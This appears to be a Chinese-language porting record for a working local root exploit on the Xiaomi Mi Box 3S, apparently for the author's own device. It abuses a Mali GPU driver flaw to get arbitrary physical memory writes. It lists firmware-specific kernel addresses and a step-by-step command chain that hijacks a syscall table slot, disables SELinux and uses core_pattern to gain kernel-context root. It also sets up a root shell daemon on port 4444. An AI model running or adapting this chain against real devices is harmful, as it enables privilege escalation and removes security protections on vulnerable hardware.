# Mi Box 3S（MDZ-19-AA / `queenchristina`）移植记录

> 目标：小米盒子 3S，build `8.2.2.817`，Android **6.0.1**（SDK 23），
> 内核 `3.14.29-301318-g9206404`（2018-02-02 构建），armv8l，
> SELinux **Enforcing**，安全补丁级别 2017-04-01。
> 结果：**uid=0(root)，context `u:r:kernel:s0`，`CapEff 0000001fffffffff`**。

根因与 MiTV4 相同（Amlogic 派生 Utgard 的
`mali_mem_validation_check()` 被编译成 `return _MALI_OSK_ERR_OK`），
`/dev/mali`、`/dev/ion` 均为 0666，因此任意本地进程都能获得
「任意物理地址 128 字节写」。

## 本固件的地址常量

| 符号 / 位置 | 值 |
|---|---|
| `sys_call_table` 物理基址 | `0x1ee7000`（虚拟 `0xffffffc001ee7000`） |
| `sys_call_table[244]` 物理 | **`0x1ee77a0`** |
| `kallsyms_lookup_name` | `0xffffffc00111e5d0`（size `0xa0`） |
| `memcpy` | `0xffffffc0013e1270` |
| `selinux_enforcing` | `0xffffffc0020cff24` |
| `core_pattern` | `0xffffffc001f1c0c8` |

段边界（`/proc/iomem`）：code `0x1080000–0x1dbd183`，
rodata `0x1dbd184–0x1ed3fff`，Kernel data `0x1ed4000–0x2421fff`。

## 移植时踩到的三个坑（重要）

### 1. `/dev/ion` 的 mmap 在这个固件上是坏的

任何对 ion/dma-buf fd 的 `mmap()`（包括 `MAP_FIXED`）都返回 **`0x400008`**：

```
ion_map fd   mmap(NULL) = 0x400008 errno=0
share fd     mmap(NULL) = 0x400008 errno=0
raw mmap2    = 0x400008
mmap(FIXED)  = 0x400008
```

原版 `gpu_arb_write` 用 ion 分配命令缓冲区，`build_shader()` 往这个地址一写就
段错误——**GPU job 根本没提交**。表现就是「写原语时好时坏」，偶发成功只是因为
`0x400008` 恰好落在该进程已映射的段里。之前所有基于它的扫描都是空转。

**绕过办法**（`src/gpwrite.c`）：命令缓冲区改用普通文件页自己 mmap（正常地址），
物理地址从 `/proc/self/pagemap` 取，再用 `MALI_IOC_MEM_BIND` 的
**external 后端**绑到 `CMD_VA`，提交前用 `__ARM_NR_cacheflush` 刷 D-cache。

### 2. 64 位 / 32 位走的是两张不同的表

| 调用者 | 使用的表 | 位置 |
|---|---|---|
| 32 位 | `compat_sys_call_table` | `.text` |
| **64 位** | `sys_call_table` | `.data`/`.rodata` |

扫描器与「调内核函数」的 helper **必须是 64 位**，否则检测的是另一张表，
永远不可能命中。

### 3. `sys_call_table` 的缓存行是热的 —— GPU 写下去看不到

`sys_call_table` 每次系统调用都会被读，缓存行常驻 L1/L2。GPU 是 DMA 写，
**不经过 CPU 缓存**：内存改了、CPU 仍从缓存取旧值，`syscall(244)` 继续走
`sys_ni_syscall`。如果没有这一步，扫遍整个 `.data`/`.rodata` 都不会命中
（实测同一页无冲刷扫过、有冲刷才中）。

**对策**：写入后、调用前，走 8MB 缓冲把缓存冲刷一遍，强制该行换出重载。
`kfunc_new` 与 `gpwrite64` 的调用路径都已内置 `cache_thrash()`。

## 复现链路

```
# 0) 推工具
adb push gpwrite64 kfunc_new crash_for_core roothelper.sh root_cmd.sh /data/local/tmp/
adb shell chmod 755 /data/local/tmp/{gpwrite64,kfunc_new,crash_for_core,roothelper.sh,root_cmd.sh}

# 1) slot 244 -> kallsyms_lookup_name
gpwrite64 write 1ee77a0 ffffffc00111e5d0            # (64 位进程，内部会冲刷缓存)

# 2) 解析 memcpy（槽位是 kallsyms_lookup_name 时的用法）
kfunc_new sym memcpy        # -> 0xffffffc0013e1270

# 3) slot 244 -> memcpy，得到任意内核读写
gpwrite64 write 1ee77a0 ffffffc0013e1270

# 4) 关 SELinux（必须走 CPU 侧写，GPU 写对热变量无效）
kfunc_new zero 0xffffffc0020cff24 4
getenforce                  # -> Permissive

# 5) core_pattern -> root
kfunc_new str 0xffffffc001f1c0c8 '|/data/local/tmp/roothelper.sh'
/data/local/tmp/crash_for_core      # 触发带 core 的崩溃
cat /data/local/tmp/root_out.txt    # uid=0(root) context=u:r:kernel:s0
```

## 日常怎么用这个 root

`roothelper.sh` 被内核以 root 拉起后会做两件事：把常驻的 **root shell 守护进程
`rsd`** 起起来（监听 `127.0.0.1:4444`，仅回环，不暴露到局域网），并按需执行
`/data/local/tmp/root_cmd.sh`。所以拿到 root 后最顺手的用法是：

```sh
# 一条 root 命令
adb shell "echo 'id' | /data/local/tmp/rsh"

# 交互式 root shell（提示符不会显示，但每条命令都以 uid=0 执行）
adb shell /data/local/tmp/rsh
# 例：
#   cp /system/etc/hosts /data/local/tmp/hosts.bak
#   setprop persist.adb.tcp.port 5555
#   dmesg | tail

# 不想走 adb shell 的话，把回环口转发到电脑：
adb forward tcp:4444 tcp:4444
# 然后用 PuTTY / nc / PowerShell TcpClient 连 127.0.0.1:4444
```

`rsd` 只监听回环，且随重启消失；重启后先跑一次
`adb shell sh /data/local/tmp/reroot.sh`（它会重新打通链路并顺手把 `rsd`
再拉起来）。

需要一次性跑一段脚本（而不是交互）时，也可以写 `/data/local/tmp/root_cmd.sh`
再触发一次 `crash_for_core`，结果会落到 `/data/local/tmp/root_out.txt`。

## 工具说明

| 文件 | 作用 |
|---|---|
| `src/gpwrite.c` | ion-free 的任意物理 128 字节写；`place` 自检、`write`、`scan`（带冲刷的槽位探测） |
| `src/kfunc.c` | 通过 slot 244 调内核函数：`sym` / `zero` / `str` / `show` / `call` / `bt`（`%pS` 符号化 oracle）/ `dump` |
| `tools/crash_for_core.c` | 设置 RLIMIT_CORE 并触发 SIGSEGV，驱动 `core_pattern` |
| `tools/roothelper.sh` | 以 root 执行 `/data/local/tmp/root_cmd.sh` |

换到别的固件（尤其是**没有 root** 的版本）怎么重新定位这两个常量，见
[`FINDING_ADDRESSES.md`](FINDING_ADDRESSES.md)。

`kfunc_new bt <addr>` 是一个**只读的符号化探针**：伪造 `pt_regs` 交给
`dump_backtrace`，内核用 `%pS` 把任意地址打成 `symbol+off/size`，
不执行、不会崩 —— 移植到新固件时用它来找 `kallsyms_lookup_name`
（注意 `sp` 不能 16K 对齐，否则 `unwind_frame()` 的区间校验会失败）。

## 持久化：为什么这台机器做不到「重启后仍 root」

所有改动（`sys_call_table` 表项、`selinux_enforcing`、`core_pattern`）都在 RAM，
重启即还原。想要持久的 setuid `su`，只能放进 `/system`，但：

- `/system` 挂在 `/dev/block/dm-0`，`dmesg` 明确打印
  `fs_mgr: Enabling dm-verity for system (mode 0)`，只读；改它会导致下次开机
  校验失败；
- `/data` 与 `/cache` 都是 `nosuid,nodev` 挂载，放 setuid 二进制无效；
- 关 verity 需要改 boot 分区的 ramdisk（fstab 里的 `verify` 标记），但
  **这个固件的 boot 镜像是加密的**：从设备 dump 出的 `boot.img` 中
  kernel 段熵 `8.000`、ramdisk 段熵 `7.999`，且不匹配 gzip/lz4/xz 任何魔数
  （Amlogic secure boot）。没有 OEM 密钥就无法重新生成 bootloader 接受的镜像；
- `ro.build.type=user`、`ro.debuggable=0` ⇒ adbd 不能以 root 跑，
  标准的 `adb disable-verity` 也用不了。

因此本机的现实做法是**每次开机重跑一遍**（5 秒）：

```
adb shell sh /data/local/tmp/reroot.sh
```

`reroot.sh` 会重新写表项、关 SELinux、设 `core_pattern` 并触发 coredump，
最后把 `uid=0` 的结果写进 `/data/local/tmp/reroot.log`。
`/data/local/tmp/su`（静态、setgid/setuid(0) 后 exec `/system/bin/sh`）已经准备好，
一旦哪天 verity 被关闭，直接 `cp` 到 `/system/xbin/su` 并 `chmod 4755` 即可。

**例外是 tvagent 的开机自启**，它不依赖 root 持久化：`flash_recovery` 的
`u:r:install_recovery:s0` 域建不了 socket、不能 `setexec`/`setenforce`/`setprop`、
看不到 `/dev/mali`、也进不了 `/data/local/tmp`，所以 `install-recovery.sh` 那条路
在 enforcing 下走不通。可行位置是 console shell 的 `/system/etc/mkshrc`
（`u:r:shell:s0`，开机由 `on property:ro.debuggable=1` 拉起），里面用
`su 0` 把 agent 拉进 `u:r:su:s0`。但**必须等 `sys.boot_completed=1` 之后再起**
——console shell 比 system_server 还早，agent 从第一秒就每 3 秒跑一次
`dumpsys activity`，1 GB 的盒子会被拖死在开机 logo。
延迟启动后实测：重启 ~33 s `boot_completed=1`，~41 s agent 在 `:8765` 监听。
完整证据、部署与回滚见 [AGENT_AUTOSTART.md](AGENT_AUTOSTART.md)。

## 备份

已通过 root 通道把 boot-critical 分区 dump 到设备的 `/data/local/tmp/backup/`，
并拉回电脑的 `backup/`：

| 文件 | 大小 | 说明 |
|---|---|---|
| `boot.img` | 20 MB | `ANDROID!` 头有效，kernel 0x6a3800 / ramdisk 0xe1800 / page 0x800；内容加密 |
| `recovery.img` | 32 MB | `ANDROID!` 头有效，内容同样加密 |
| `bootloader.img` | 4 MB | |
| `env.img` | 4 MB | u-boot 环境 |
| `misc.img` | 32 MB | BCB |
| `logo.img` | 3 MB | |
| `persist.img` | 8 MB | |
| `tee.img` | 8 MB | |
| `reserved.img` | 8 MB | |

注意：这些备份**只在设备还能起来、还能跑 adb 时才有意义**；它们救不了刷坏的
boot 分区（recovery 里没有可用的 adb shell，手上也没有 8.2.2.817 的完整固件）。

## 与 MiTV4 的差异

| 项 | MiTV4 | Mi Box 3S |
|---|---|---|
| Android | 6.0.1 | 6.0.1（build 号是小米自己的 `8.2.2.817`） |
| `sys_call_table` 物理 | `0x1f6f000` | `0x1ee7000` |
| `kallsyms_lookup_name` | `0xffffffc00111f308` | `0xffffffc00111e5d0` |
| `memcpy` | `0xffffffc0013e75c0` | `0xffffffc0013e1270` |
| `selinux_enforcing` | `0xffffffc0021697bc` | `0xffffffc0020cff24` |
| `core_pattern` | — | `0xffffffc001f1c0c8` |

地址不能跨固件照抄：MiTV4 的 `0x111f308` 在这台机器上落在
`do_acct_process.isra.4+0x368` 里。用 `bt` oracle 先验证再使用。
